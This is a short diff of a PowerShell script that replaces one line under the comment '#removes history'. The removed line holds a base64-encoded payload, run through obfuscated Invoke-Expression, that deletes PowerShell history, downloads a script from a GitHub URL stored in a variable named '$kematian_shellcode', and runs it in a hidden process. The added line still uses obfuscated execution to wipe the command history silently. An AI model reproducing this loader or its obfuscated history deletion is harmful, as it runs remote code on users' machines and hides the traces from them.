@@ -1336,7 +1336,7 @@ if (CHECK_AND_PATCH -eq $true) {
     $script:SingleInstanceEvent.Close()
     $script:SingleInstanceEvent.Dispose()
     #removes history
-    I'E'X([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("UmVtb3ZlLUl0ZW0gKEdldC1QU3JlYWRsaW5lT3B0aW9uKS5IaXN0b3J5U2F2ZVBhdGggLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiRrZW1hdGlhbl9zaGVsbGNvZGUgPSAoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS80M2ExNzIzL3Rlc3QvbWFpbi9kb3dubG9hZC5wczEiKQokZG93bmxvYWQgPSAiKE5ldy1PYmplY3QgTmV0LldlYmNsaWVudCkuIiJgRG93TmxvQWRTYFRSYGlgTmBnIiIoJyRrZW1hdGlhbl9zaGVsbGNvZGUnKSIKU3RhcnQtUHJvY2VzcyAicG93ZXJzaGVsbCIgLUFyZ3VtZW50ICJJJ0UnWCgkZG93bmxvYWQpIiAtTm9OZXdXaW5kb3cgLVBhc3NUaHJ1")))
+    I'E'X([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("UmVtb3ZlLUl0ZW0gKEdldC1QU3JlYWRsaW5lT3B0aW9uKS5IaXN0b3J5U2F2ZVBhdGggLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl")))
     if ($debug) {
         Read-Host -Prompt "Press Enter to continue"
     }
